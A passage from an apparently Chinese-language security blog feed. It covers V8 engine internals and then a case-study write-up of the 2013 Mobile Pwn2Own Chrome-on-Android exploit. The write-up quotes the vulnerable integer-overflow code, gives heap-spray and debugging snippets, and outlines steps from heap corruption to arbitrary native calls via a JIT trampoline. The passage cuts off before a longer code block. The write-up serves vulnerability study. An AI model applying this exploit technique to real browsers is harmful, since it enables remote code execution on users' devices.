class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smi</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> Smi* <span class="title">FromInt</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;Smi*&gt;(value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">value</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">Smi* <span class="title">NewSmi</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> Smi::FromInt(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>, NewSmi(<span class="number">120</span>)-&gt;value(), NewSmi(<span class="number">110</span>)-&gt;value());</span><br><span class="line">  <span class="comment">// out 120 110</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，在v8::i::HeapObject的情况下，设置低位为1，但在Smi的情况下，结尾用0作标记，<br>通过cast可以直接进行数值计算。 因此，没有开销。<br>在64位CPU的情况下，由于指针是64位，因此可以存储更大的整数，但是为了与32位兼容，仅使用31位区域。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-09-172242.png" alt=""></p><h3 id="JSReceiver"><a href="#JSReceiver" class="headerlink" title="JSReceiver"></a>JSReceiver</h3><ul><li>JSArray</li><li>JSArrayBuffer</li><li>JSArrayBufferView<ul><li>JSTypedArray</li><li>JSDataView</li></ul></li><li>JSBoundFunction</li><li>JSCollection<ul><li>JSSet</li><li>JSMap</li></ul></li><li>JSStringIterator</li><li>JSSetIterator</li><li>JSMapIterator</li><li>JSWeakCollection<ul><li>JSWeakMap</li><li>JSWeakSet</li></ul></li><li>JSRegExp</li><li>JSFunction</li><li>JSGeneratorObject</li><li>JSGlobalObject</li><li>JSGlobalProxy</li><li>JSValue<ul><li>JSDate</li></ul></li><li>JSMessageObject</li><li>JSModuleNamespace</li><li>WasmInstanceObject</li><li>WasmMemoryObject</li><li>WasmModuleObject</li><li>WasmTableObject</li></ul><p>这些v8::i::JS~类是类的真实形式，例如v8::String和v8::Array通过API使用它们。<br>诸如v8::String之类的类只是wrapper类。<br>所有实际的实现都是v8::i::JS~类。</p><h3 id="FixedArrayBase"><a href="#FixedArrayBase" class="headerlink" title="FixedArrayBase"></a>FixedArrayBase</h3><p>v8::i::FixedArray的基本实现，它是v8中的常用类。<br>v8在里面到处都在使用这个固定长度的数组，v8::i::FixedArray有以下层次结构。</p><ul><li>DescriptorArray</li><li>FrameArray</li><li>HashTable<ul><li>Dictionary</li><li>StringTable</li><li>StringSet</li><li>CompilationCacheTable</li><li>MapCache</li></ul></li><li>OrderedHashTable<ul><li>OrderedHashSet</li><li>OrderedHashMap</li></ul></li><li>Context</li><li>FeedbackMetadata</li><li>TemplateList</li><li>TransitionArray</li><li>ScopeInfo</li><li>ModuleInfo</li><li>ScriptContextTable</li><li>WeakFixedArray</li><li>WasmSharedModuleData</li><li>WasmCompiledModule</li></ul><p>特别的，v8::i::DescriptorArray是一个存储属性描述符的数组。</p><h3 id="CodeStubAssembler-CSA"><a href="#CodeStubAssembler-CSA" class="headerlink" title="CodeStubAssembler (CSA)"></a>CodeStubAssembler (CSA)</h3><p>在v8中使用的DSL语言。<br>实际上，在v8中，编写汇编语言并不是什么新鲜事。<br>相反，通过描述可以输出汇编的CSA，可以输出具有更高<strong>可维护性</strong>的<strong>高速</strong>代码。<br>CSA的一个例子如下所示。<br>计算Fibonacci数,并将其存储在数组中.<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fibonacci</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">1</span>, b = <span class="number">0</span>, temp;</span><br><span class="line">  <span class="keyword">const</span> result = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (num &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">    result.push(a);</span><br><span class="line">    temp = a;</span><br><span class="line">    a = a + b;</span><br><span class="line">    b = temp;</span><br><span class="line">    num--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>将javascript函数转换为CSA时，它将成为以下代码。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">TNode&lt;JSArray&gt; Fibonacci(TNode&lt;Context&gt; context) &#123;</span><br><span class="line">  TVARIABLE(var_a, MachineType::PointerRepresentation(), IntPtrConstant(<span class="number">0</span>));</span><br><span class="line">  TVARIABLE(var_b, MachineType::PointerRepresentation(), IntPtrConstant(<span class="number">1</span>));</span><br><span class="line">  TVARIABLE(var_temp, MachineType::PointerRepresentation());</span><br><span class="line">  TVARIABLE(var_index, MachineType::PointerRepresentation());</span><br><span class="line"></span><br><span class="line">  Node* fixed_array = AllocateFixedArray(PACKED_ELEMENTS, IntPtrConstant(<span class="number">11</span>),</span><br><span class="line">                           INTPTR_PARAMETERS, kAllowLargeObjectAllocation)</span><br><span class="line"></span><br><span class="line">  Label loop(<span class="keyword">this</span>), after_loop(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">  Branch(IntPtrGreaterThan(IntPtrConstant(<span class="number">100</span>), var_index), &amp;loop, &amp;after_loop);</span><br><span class="line">  BIND(&amp;loop);</span><br><span class="line">  &#123;</span><br><span class="line">    StoreFixedArrayElement(fixed_array, SmiTag(var_index), var_a,</span><br><span class="line">                           SKIP_WRITE_BARRIER);</span><br><span class="line">    var_temp.Bind(var_a);</span><br><span class="line">    var_a.Bind(IntPtrAdd(var_a, var_b));</span><br><span class="line">    var_b.Bind(var_temp);</span><br><span class="line">    Increment(&amp;var_index, <span class="number">1</span>);</span><br><span class="line">    Branch(IntPtrGreaterThan(IntPtrConstant(<span class="number">100</span>), var_index),</span><br><span class="line">           &amp;loop, &amp;after_loop);</span><br><span class="line">  &#125;</span><br><span class="line">  BIND(&amp;after_loop);</span><br><span class="line">  Node* native_context = LoadNativeContext(context);</span><br><span class="line">  Node* array_map = LoadJSArrayElementsMap(PACKED_ELEMENTS, native_context);</span><br><span class="line">  Node* <span class="built_in">array</span> = AllocateUninitializedJSArrayWithoutElements(</span><br><span class="line">      array_map, SmiConstant(<span class="number">12</span>), <span class="literal">nullptr</span>);</span><br><span class="line">  StoreObjectField(<span class="built_in">array</span>, JSArray::kElementsOffset, fixed_array);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">array</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>尽管它在某种程度上是抽象的，并且有很多冗余代码，但是它不是比汇编更容易阅读吗？</p><h2 id="阅读代码"><a href="#阅读代码" class="headerlink" title="阅读代码"></a>阅读代码</h2><p>阅读v8代码非常麻烦，但有几种方法。</p><p>首先，使用每个IDE的代码跳转。<br>但是，由于v8使用了大量的宏，甚至即使是类的函数定义也可能由宏执行，因此最好在找不到时使用find | grep。</p><p>即使您阅读了代码，您可能也不知道执行时的状态，或者您可能不知道调用的层次结构，因此您应该在调试时按以下方式检查它。</p><ul><li>c++<br>由于src/base/debug/stack_trace.h中有一个StackTrace类，所以最好在要的点调用StackTrace st; st.Print()。<br>此外，由于继承v8::Object类的对象始终具有Print方法，因此可以通过调用 -&gt;Print()来查看内容。</li><li>CSA<br>由于Print()函数是在CodeStubAssembler中定义的，我们在那里传递Node *并输出执行a-&gt; Print()的代码。<br>但是，要小心，因为传递IntPtrT会失败。 在这种情况下，你可以做SmiTag。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;v8代码组成&quot;&gt;&lt;a href=&quot;#v8代码组成&quot; class=&quot;headerlink&quot; title=&quot;v8代码组成&quot;&gt;&lt;/a&gt;v8代码组成&lt;/h2&gt;&lt;h3 id=&quot;目录结构概要&quot;&gt;&lt;a href=&quot;#目录结构概要&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>case study:Mobile PWN2OWN Autumn 2013 - Chrome on Android - Exploit Writeup</title>
    <link href="http://eternalsakura13.com/2018/07/05/p2o_2013/"/>
    <id>http://eternalsakura13.com/2018/07/05/p2o_2013/</id>
    <published>2018-07-05T06:37:50.936Z</published>
    <updated>2018-10-22T14:25:51.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit" target="_blank" rel="noopener">https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit</a><br><a href="http://cygx.mydns.jp/blog/?arti=527" target="_blank" rel="noopener">http://cygx.mydns.jp/blog/?arti=527</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>从exploit的角度来看，它们都不是那么重要，但是最好从源码上了解</p><ul><li>Handle/HandleScope</li><li>Context</li><li>Isolate</li><li>Platform</li><li>Interpreter</li><li>blob</li><li>ICU</li><li>third_party</li><li>tools</li></ul><p>参考资料：<a href="https://github.com/v8/v8/wiki/Embedder&#39;s-Guide" target="_blank" rel="noopener">https://github.com/v8/v8/wiki/Embedder&#39;s-Guide</a></p><h3 id="Handle-HandleScope"><a href="#Handle-HandleScope" class="headerlink" title="Handle/HandleScope"></a>Handle/HandleScope</h3><ul><li>Handle<ul><li>要启用GC跟踪，指针包装类型<ul><li>为了对应任何类型的指针，请使用C++模板</li><li>在源代码中，所有Object都使用此Handle<t>类型进行管理</t></li><li>GC有可能移动Object的位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-124518.png" alt=""><br>即使GC移动该Object，由于handle不移动，所以没有不一致</li></ul></li><li>常用Handle<ul><li>Handle<t><ul><li>Abstract class</li></ul></t></li><li>Local<t><ul><li>Temporary Handle, 保留在stack上</li><li><strong>使用后面将介绍的HandleScope进行生命周期管理</strong></li></ul></t></li><li>MaybeLocal<t><ul><li>它与Local<t>相同，但在使用前检查它是否为空</t></li></ul></t></li><li>Persistent<t><ul><li>一个persistent Handle,保留在heap上</li><li>代码编写器使用Persistent::Reset（）管理生命周期</li></ul></t></li></ul></li></ul></li><li>HandleScope<ul><li>handle总结<ul><li>Temporary Handle such as Local <t>, MaybeLocal<t></t></t></li><li>在声明HandleScope时，块中的每个handle都会自动关联</li></ul></li><li><strong>当HandleScope超出范围时，它会处理释放handle</strong><ul><li>返回函数时，结束{}时，等</li><li>用所有使用的handle来描述释放处理是低效的</li><li>使用HandleScope的析构函数，GC负责实际的释放处理</li></ul></li><li>参考以下的文件<ul><li>include/v8.h，src/handles.h</li></ul></li></ul></li></ul><h3 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><ul><li>在一个V8实例中创建多个执行环境的机制<ul><li>您可以在一个线程中同时运行彼此独立的JavaScript代码</li></ul></li><li>每个Context对象都有一个全局的Root-Object</li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-132114.png" alt=""><br>左边：每个context都有一个Root-Object，并且彼此独立（在本例中，context是嵌套的，但Root-Object正确切换）<br>右边：总之，它实现了环境的切换。 我们希望分别通过window，iframe和extended script来独立保护环境。所谓的origin也是在Context中定义的，并且从一个Context到另一个Context的访问不能被默认完成。</p><h3 id="Isolate"><a href="#Isolate" class="headerlink" title="Isolate"></a>Isolate</h3><ul><li>Instance of V8 itself<ul><li>context是在同一个instance中实现不同的执行环境</li><li>当你想运行自己的多个instance时使用Isolate<ul><li>为了适应多线程</li></ul></li></ul></li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-133452.png" alt=""></p><h3 id="Platform"><a href="#Platform" class="headerlink" title="Platform"></a>Platform</h3><ul><li>It seems to define the operating environment (it seems)<ul><li>线程相关<ul><li>决定后台线程和前台线程</li><li>管理线程池</li></ul></li><li>任务队列管理</li><li>事件追踪</li></ul></li></ul><h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[src/v8/src/runtime.cc]</span><br><span class="line">RUNTIME_FUNCTION(MaybeObject*, Runtime_TypedArrayInitializeFromArrayLike)</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">size_t</span> byte_length = length * element_size;<span class="comment">//integer overflow</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (byte_length &lt; length) &#123;</span><br><span class="line">    <span class="keyword">return</span> isolate-&gt;Throw(*isolate-&gt;factory()-&gt;</span><br><span class="line">      NewRangeError(<span class="string">"invalid_array_buffer_length"</span>,</span><br><span class="line">      HandleVector&lt;Object&gt;(<span class="literal">NULL</span>, <span class="number">0</span>)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!Runtime::SetupArrayBufferAllocatingData(</span><br><span class="line">        isolate, buffer, byte_length, <span class="literal">false</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> isolate-&gt;Throw(*isolate-&gt;factory()-&gt;</span><br><span class="line">          NewRangeError(<span class="string">"invalid_array_buffer_length"</span>,</span><br><span class="line">            HandleVector&lt;Object&gt;(<span class="literal">NULL</span>, <span class="number">0</span>)));</span><br><span class="line">  &#125;<span class="comment">//The overflowed byte_length is passed to Runtime::SetupArrayBufferAllocatingData</span></span><br><span class="line">  <span class="comment">// which allocates the undersized buffer and initialises a V8 JSArrayBuffer object to point to it.</span></span><br><span class="line"></span><br><span class="line">  holder-&gt;set_buffer(*buffer);</span><br><span class="line">  holder-&gt;set_byte_offset(Smi::FromInt(<span class="number">0</span>));</span><br><span class="line">  Handle&lt;Object&gt; byte_length_obj(</span><br><span class="line">      isolate-&gt;factory()-&gt;NewNumberFromSize(byte_length));</span><br><span class="line">  holder-&gt;set_byte_length(*byte_length_obj);</span><br><span class="line">  holder-&gt;set_length(*length_obj);</span><br><span class="line">  holder-&gt;set_weak_next(buffer-&gt;weak_first_view());</span><br><span class="line">  buffer-&gt;set_weak_first_view(*holder);</span><br><span class="line"></span><br><span class="line">  Handle&lt;ExternalArray&gt; elements =</span><br><span class="line">      isolate-&gt;factory()-&gt;NewExternalArray(</span><br><span class="line">          <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(length), array_type,</span><br><span class="line">          <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(buffer-&gt;backing_store()));</span><br><span class="line">  holder-&gt;set_elements(*elements);</span><br><span class="line">  <span class="comment">//This JSArrayBuffer is then pointed to by a JSTypedArray for the Float64 </span></span><br><span class="line">  <span class="comment">//type which uses the original length property of the arrayLike object (which is in 8 byte units,</span></span><br><span class="line">  <span class="comment">// not bytes) to create an ExternalArray that will actually be used to manipulate the </span></span><br><span class="line">  <span class="comment">//underlying ArrayBuffer memory from javascript.</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ArrayBuffer* V8ArrayBuffer::toNative(v8::Handle&lt;v8::Object&gt; object)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    v8::ArrayBuffer::Contents v8Contents = v8buffer-&gt;Externalize();</span><br><span class="line"></span><br><span class="line">    ArrayBufferContents contents(v8Contents.Data(), v8Contents.ByteLength(),</span><br><span class="line">        V8ArrayBufferDeallocationObserver::instanceTemplate());</span><br><span class="line"></span><br><span class="line">    RefPtr&lt;ArrayBuffer&gt; buffer = ArrayBuffer::create(contents);</span><br><span class="line"></span><br><span class="line">    V8DOMWrapper::associateObjectWithWrapper&lt;V8ArrayBuffer&gt;(buffer.release(), &amp;wrapperTypeInfo, object, v8::Isolate::GetCurrent(), WrapperConfiguration::Dependent);</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bufferData1Method</span><span class="params">(<span class="keyword">const</span> v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">    V8TRYCATCH_VOID(ArrayBuffer*, data, info[<span class="number">1</span>]-&gt;IsArrayBuffer() ? V8ArrayBuffer::toNative(v8::Handle&lt;v8::ArrayBuffer&gt;::Cast(info[<span class="number">1</span>])) : <span class="number">0</span>);</span><br><span class="line">...</span><br><span class="line">    imp-&gt;bufferData(target, data, usage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h2><p><code>obj.__defineGetter__(property, func)</code><br>The square bracket array syntax (eg: foo[1]) when applied to regular javascript objects is also just reading a property, even if the property is a number this will still invoke a getter if one has been defined.</p><h2 id="需要调试的"><a href="#需要调试的" class="headerlink" title="需要调试的"></a>需要调试的</h2><p>backing store</p><ul><li><p>Uint8<br>meta 0x13381<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-06-024853.png" alt=""></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t_arr=<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">0x13370</span>);</span><br><span class="line">t_arr[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">t_arr[<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">t_arr[<span class="number">2</span>]=<span class="number">3</span>;</span><br><span class="line">t_arr[<span class="number">3</span>]=<span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">%DebugPrint(t_arr)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li><li><p>Float64<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-06-024759.png" alt=""><br>meta 0x9a002<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-06-024821.png" alt=""></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t_arr=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">0x13370</span>);</span><br><span class="line">t_arr[<span class="number">0</span>]=<span class="number">1.0</span>;</span><br><span class="line">t_arr[<span class="number">1</span>]=<span class="number">2.0</span>;</span><br><span class="line">t_arr[<span class="number">2</span>]=<span class="number">3.0</span>;</span><br><span class="line">t_arr[<span class="number">3</span>]=<span class="number">4.0</span>;</span><br><span class="line"></span><br><span class="line">%DebugPrint(t_arr)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li></ul><p>其他需要调试的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initialOverwrite</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arrays = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">300</span>);</span><br><span class="line">    <span class="keyword">var</span> arraysI = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createArray</span>(<span class="params">byteSize, num</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(byteSize);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; byteSize; i++) &#123;</span><br><span class="line">            a[i] = <span class="number">0x42</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        arrays[arraysI++] = a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrays.length; i++) &#123;</span><br><span class="line">    createArray(<span class="number">0x20000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路，调试到backstore，看一下页分布？</p><h2 id="log"><a href="#log" class="headerlink" title="log"></a>log</h2><ol><li>因为我们知道如果相乘溢出，它会溢出到数组长度以下，有没有问题？<br>曾经有一段时间我这么认为。但是，在某些情况下它会溢出，但是绕过判断。<br>例如，0x24924924(length) float64（8字节）在32位环境中受到保护。<br>然后byte_length溢出，byte_length = 0x24924924 * 8 = 0x124924928 -&gt; 0x24924928<br>但在32位环境中它不满足byte_length &lt; length,并将通过检查。</li></ol><ol><li><p>修改大小并free chunk(j)之后用WTF::ArrayBuffer占位<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-06-024535.png" alt=""></p></li><li><p>all the ArrayBuffer structures we’ve seen up until now (apart from the actual backing buffer) have been in the V8 GC heap whereas the memory corruption is happening in the dlmalloc heap.</p></li><li><p>Well, from here on, we prepare to execute arbitrary code (prepareForCalls).<br>We also make WTF :: DataView and read its vtbl. Then, since you know the position of .text, search for gadget (code fragment) calling dlsym from there. Follow PLT (Procedure Linkage Table) and load the thread_data<em>table</em> pointer of v8. Then you follow the structure and you will know the position of JS’s heap. There is also rwx JITed code storage. Then eval the function that generates dummy findable code, find the JIT machine code, and rewrite it to trampoline. Trampoline is a piece of code that calls a function by writing the value written in callbuf back to the register so that you can call any native function or systemcall with arbitrary argument using the function on JS! The attacker could now completely control the inside of the sandbox.</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span 